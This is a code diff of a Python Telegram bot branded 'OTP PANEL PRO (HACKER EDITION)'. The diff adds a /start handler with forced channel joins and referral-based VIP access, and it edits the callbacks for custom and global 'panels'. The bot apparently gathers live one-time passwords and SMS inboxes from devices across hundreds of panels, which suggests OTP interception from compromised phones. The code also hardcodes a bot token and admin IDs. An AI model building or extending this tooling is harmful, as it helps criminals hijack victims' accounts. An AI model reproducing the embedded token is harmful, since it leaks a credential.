@@ -6,7 +6,7 @@
   + Strict 1-Hour Fast Inbox + Background Ghost Workers
   + Referral System + Force Join + Hourly Admin Backups
   + 10-MILLION USER SCALE ARCHITECTURE (CRASH PROOF)
-  + UPDATED SUPERASSETS API KEYS & ADMIN SYNC FIX
+  + MISSING HANDLERS FIXED
 ══════════════════════════════════════════════════════
 """
 
@@ -54,7 +54,6 @@ PAGE_SIZE       = 20
 TOKEN           = "8839521261:AAFjpwMHtt3TtECRmfKHirqUw0i7tPUQRpQ"
 BOT_USERNAME    = "offermeeshobot"
 
-# 🔴 All your Admin IDs are registered here
 ADMIN_IDS: set[int] = {
     6860106371, 6655430457, 8952265700, 1985648746
 }
@@ -1086,6 +1085,67 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     return unique_devices
 
 # ═══════════════════════════════════════════════════════
+#  TELEGRAM COMMAND HANDLERS
+# ═══════════════════════════════════════════════════════
+
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    chat_id  = update.effective_chat.id
+    bot_token = ctx.bot.token
+    user = update.effective_user
+    
+    if not await check_force_join(ctx.bot, chat_id):
+        join_kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("Join Channel 1", url="https://t.me/sabkijayhokhush")],
+            [InlineKeyboardButton("Join Channel 2", url="https://t.me/leakmethodfree")],
+            [InlineKeyboardButton("Join Group", url="https://t.me/rosekhudkabanaya")],
+            [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
+        ])
+        await update.message.reply_text("⚠️ **ACCESS DENIED**\n\nAapko bot use karne ke liye pehle hamare sabhi Channels aur Group join karne honge. Join karke 'I have joined' par click karein.", reply_markup=join_kb, parse_mode="Markdown")
+        return
+
+    args = ctx.args
+    if chat_id not in all_users:
+        all_users[chat_id] = {
+            "name": user.first_name,
+            "username": user.username or "",
+            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
+            "verified": True,
+            "referrals": 0,
+            "coins": 0,
+            "vip_until": 0.0,
+            "otp_count": 0,
+            "custom_dbs": [],
+            "user_panels_mode": False,
+            "referred_by": None
+        }
+        if args and args[0].startswith("ref_"):
+            try:
+                referrer_id = int(args[0].split("_")[1])
+                if referrer_id in all_users and referrer_id != chat_id:
+                    all_users[chat_id]["referred_by"] = referrer_id
+                    all_users[referrer_id]["referrals"] += 1
+                    
+                    if all_users[referrer_id]["referrals"] % 20 == 0:
+                        all_users[referrer_id]["vip_until"] = time.time() + (24 * 3600)
+                        try:
+                            await ctx.bot.send_message(referrer_id, "🎉 **CONGRATULATIONS!**\nAapke 20 refers pure ho gaye! Aapko **24 Hours ka VIP Access (Global Panels)** mil gaya hai!", parse_mode="Markdown")
+                        except: pass
+            except: pass
+        save_user(chat_id)
+
+    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+    chats_registry.setdefault(bot_token, set()).add(chat_id)
+    
+    welcome_text = (
+        f"🔥 **OTP PANEL PRO (HACKER EDITION)** 🔥\n━━━━━━━━━━━━━━━━━━\n"
+        f"Welcome Master {user.first_name}!\n\n"
+        "System is connected. Focus on a device to receive live OTPs.\n\n"
+        "🆓 **Free Users:** Aap sirf apne Custom Panels add karke dekh sakte hain.\n"
+        "👑 **VIP Users (20 Refer):** 24 hours ke liye Unlimited Global Panels access karein."
+    )
+    await update.message.reply_text(welcome_text, reply_markup=get_reply_menu(chat_id), parse_mode="Markdown")
+
+# ═══════════════════════════════════════════════════════
 #  CALLBACK QUERY HANDLER
 # ═══════════════════════════════════════════════════════
 
@@ -1254,24 +1314,11 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
             return await safe_edit(query, f"🔍 Search Results for: {search_term}\nSelect below to open inbox:", reply_markup=InlineKeyboardMarkup(rows))
 
-        if data.startswith("del_panel:"):
-            idx_to_del = int(data.split(":")[1])
-            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
-            if 0 <= idx_to_del < len(dbs):
-                deleted_url = dbs.pop(idx_to_del)
-                save_user(chat_id)
-                await query.answer("Panel Deleted Successfully!", show_alert=True)
-            
-            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
-            if not dbs:
-                await safe_edit(query, "You have no custom panels left.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
-                return
-            kb = []
-            for i, db in enumerate(dbs):
-                url_str = db if isinstance(db, str) else db.get("url", "")
-                kb.append([InlineKeyboardButton(f"❌ Delete: {url_str[:25]}...", callback_data=f"del_panel:{i}")])
-            kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
-            await safe_edit(query, "🗑 **Delete Custom Panels**\nSelect a panel to remove it from your account:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+        if data.startswith("set_panel:"):
+            panel_type = data.split(":")[1]
+            users_db.setdefault(chat_id, {})["selected_panel"] = panel_type
+            save_user(chat_id)
+            await safe_edit(query, f"PANEL UPDATED\n━━━━━━━━━━━━━━━━━━\nAapka panel ab {panel_type} par set ho gaya hai.\nAb 'Devices List' open karein.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
             return
 
         if data == "sa_add_global_panel":
@@ -1329,10 +1376,11 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             pending_action.pop(chat_id, None)
             devices = await get_all_devices(bot_token, chat_id, users_db)
             if not devices:
+                # 🔴 FIXED ADMIN SYNC WAIT MSG
                 if chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("vip_until", 0) > time.time():
-                    await safe_edit(query, "⏳ **System Syncing...**\n\nBot abhi 300+ panels se live devices fetch kar raha hai. Kripya 15-20 seconds wait karein aur phir se try karein.", parse_mode="Markdown")
+                    await safe_edit(query, "⏳ **System Syncing...**\n\nBot abhi 300+ panels se live devices fetch kar raha hai. Kripya 15-20 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
                 else:
-                    await safe_edit(query, "❌ No devices found. Check if your Ghost mode is stuck on empty panels.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
+                    await safe_edit(query, "❌ No devices found. Please Add Custom Panels or Refer to get VIP Global access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                 return
             await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
             return
@@ -1767,7 +1815,7 @@ async def poll_loop(app: Application) -> None:
         await asyncio.sleep(POLL_INTERVAL)
 
 # ═══════════════════════════════════════════════════════
-#  MAIN ENTRY POINT (WINDOWS CRASH FIX ENABLED)
+#  MAIN ENTRY POINT
 # ═══════════════════════════════════════════════════════
 
 def main() -> None:
